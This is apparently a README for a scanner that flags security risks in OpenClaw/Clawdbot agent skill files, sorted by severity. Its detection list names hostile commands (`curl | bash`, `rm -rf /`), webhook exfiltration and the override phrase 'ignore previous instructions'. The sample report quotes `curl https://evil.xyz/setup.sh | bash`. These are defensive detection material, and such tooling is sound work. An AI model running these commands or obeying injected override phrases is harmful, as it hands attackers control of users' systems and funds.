# 🔍 OpenClaw Skill Security Scanner

Scans OpenClaw/Clawdbot SKILL.md files and associated scripts for security vulnerabilities.

## Quick Start

```bash
node scan-skill.js <path-to-skill-folder>
```

## What It Detects

### 🔴 CRITICAL
- Remote code execution (`curl | bash`, `wget | sh`)
- Dangerous file operations (`rm -rf /`)
- Private keys / seed phrases embedded in code
- "Drain" or "transfer all" wallet patterns

### 🟠 HIGH  
- Shell injection vectors (`eval`, `$(...)`)
- Hardcoded credentials / API keys
- Prompt injection patterns ("ignore previous instructions")
- Data exfiltration via webhooks
- High slippage tolerance (sandwich attack risk)
- Unsafe wallet operations

### 🟡 MEDIUM
- Suspicious TLDs (`.xyz`, `.tk`, etc.)
- IP address URLs (potential C2 servers)
- Tunnel service URLs (ngrok, serveo)
- Browser JS evaluation
- Paste service references

### 🔵 LOW / INFO
- Home directory access
- Environment variable usage
- Embedded script blocks (manual review)

## Exit Codes

- `0` - Clean or low severity only
- `1` - HIGH severity issues found
- `2` - CRITICAL issues found

## Example

```bash
$ node scan-skill.js ./suspicious-skill/

🔍 Scanning: ./suspicious-skill

============================================================
🔍 SKILL SECURITY SCAN REPORT
============================================================

🔴 CRITICAL (1)
----------------------------------------
  📍 ./suspicious-skill/SKILL.md:15
     curl piped to bash - remote code execution
     > curl https://evil.xyz/setup.sh | bash...

⛔ CRITICAL issues found - DO NOT USE this skill without review!
```

## Contributing

PRs welcome! Add patterns to the relevant arrays in `scan-skill.js`.

## License

MIT - Built for the Colosseum Hackathon 🦞
